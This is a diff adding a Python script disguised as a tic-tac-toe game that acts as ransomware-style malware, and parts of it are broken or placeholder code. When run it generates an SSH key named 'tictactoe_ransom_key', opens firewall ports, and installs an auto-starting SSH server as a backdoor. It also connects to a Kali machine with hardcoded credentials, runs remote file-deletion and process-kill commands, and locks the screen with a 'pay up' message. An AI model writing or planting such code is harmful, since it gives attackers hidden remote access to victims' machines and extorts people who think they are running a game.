@@ -1,0 +1,71 @@
+import curses
+import pyautogui
+import paramiko
+import socket
+import subprocess
+import ctypes
+
+# Set up the SSH server
+ssh_port = 2222
+ssh_key_path = "ssh_key"
+ssh_key_comment = "tictactoe_ransom_key"
+
+subprocess.run(["ssh-keygen", "-f", ssh_key_path, "-C", ssh_key_comment, "-N", ""], check=True)
+subprocess.run(["netsh", "advfirewall", "firewall", "add", "rule", "name=SSH", "dir=in", "protocol=TCP", "localport=" + str(ssh_port), "action=allow"], check=True)
+subprocess.run(["netsh", "advfirewall", "firewall", "add", "rule", "name=SSH", "dir=out", "protocol=TCP", "localport=" + str(ssh_port), "action=allow"], check=True)
+subprocess.run(["sc", "create", "sshd", "binPath=C:\\Windows\\System32\\OpenSSH\\sshd.exe", "-", "DisplayName=SSH", "Start=auto"], check=True)
+subprocess.run(["sc", "start", "sshd"], check=True)
+
+# Set up the SSH client
+ssh = paramiko.SSHClient()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+# Connect to the Linux machine
+ssh.connect('linux_machine_ip_address', username='kali', password='howlsd')
+
+# Define the command to delete the Python file and kill the Python process
+delete_command = 'rm /path/to/python/file.py && pkill python'
+
+# Function to delete the Python file and kill the process
+def delete_file_and_kill_process():
+    stdin, stdout, stderr = ssh.exec_command(delete_command)
+    print(stdout.read().decode('utf-8'))
+
+# Function to lock the screen and display a message
+def lock_screen_and_display_message():
+    ctypes.windll.user32.LockWorkStation()
+    ctypes.windll.user32.MessageBoxW(0, "Your computer is locked, pay up!", "Locked", 0)
+
+# Game loop
+board = [[' ' for _ in range(3)] for _ in range(3)]
+while True:
+    # Clear the screen
+    curses.curs_set(0)
+    stdscr = curses.initscr()
+    curses.noecho()
+    stdscr.clear()
+
+    # Draw the game board
+    for i, row in enumerate(board):
+        for j, cell in enumerate(row):
+            stdscr.addstr(i, j * 4, cell)
+
+    # Wait for user input
+    event = stdscr.getkey()
+
+    # Handle user input
+    if event == 'q':
+        break
+    elif event in ['1', '2', '3', '4', '5', '6', '7', '8', '9']:
+        # Update the board based on user input
+        row = (int(event) - 1) // 3
+        col = (int(event) - 1) % 3
+        if board[row][col] == ' ':
+            board[row][col] = 'X'
+        else:
+            board[row][col] = 'O'
+
+    # Lock the screen and display a message
+    lock_screen_and_display_message()
+    delete_file_and_kill_process()
+    break
